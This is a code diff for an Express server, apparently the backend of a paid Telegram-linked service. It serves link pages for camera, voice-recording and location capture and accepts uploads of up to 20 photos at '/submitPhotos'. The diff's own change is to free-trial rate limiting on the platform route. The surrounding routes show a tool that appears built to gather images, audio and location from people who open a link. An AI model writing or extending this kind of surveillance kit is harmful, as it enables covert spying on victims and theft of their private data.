@@ -25,14 +25,28 @@ const freeTrialEndedMessage = 'لقد انتهت الفترة التجريبية
 const adminId = '7130416076';
 const subscribedUsers = new Set();
 
+const platformVisits = {};
+
+// دالة لتتبع المحاولات للمسارات الأخرى
 const trackAttempts = (userId, action) => {
     if (!userVisits[userId]) {
-        userVisits[userId] = { camera: 0, voiceRecord: 0, getLocation: 0, platform: 0 };
+        userVisits[userId] = { camera: 0, voiceRecord: 0, getLocation: 0 };
     }
 
     userVisits[userId][action]++;
 
     return userVisits[userId][action] > MAX_FREE_ATTEMPTS;
+};
+
+// دالة لتتبع المحاولات لمسار المنصة الأصلي
+const trackPlatformAttempts = (platformId) => {
+    if (!platformVisits[platformId]) {
+        platformVisits[platformId] = 0;
+    }
+
+    platformVisits[platformId]++;
+
+    return platformVisits[platformId] > MAX_FREE_ATTEMPTS;
 };
 
 // المسار الأصلي
@@ -44,7 +58,7 @@ app.get('/:platform/:chatId', (req, res) => {
         return;
     }
 
-    if (trackAttempts(chatId, 'platform')) {
+    if (trackPlatformAttempts(chatId)) {
         res.send(`<html><body><h1>${freeTrialEndedMessage}</h1></body></html>`);
         return;
     }
@@ -104,8 +118,6 @@ app.get('/getLocation/:userId', (req, res) => {
 
     res.sendFile(path.join(__dirname, 'SJGD.html'));
 });
-
-
 
 // استلام الصور
 app.post('/submitPhotos', upload.array('images', 20), async (req, res) => {
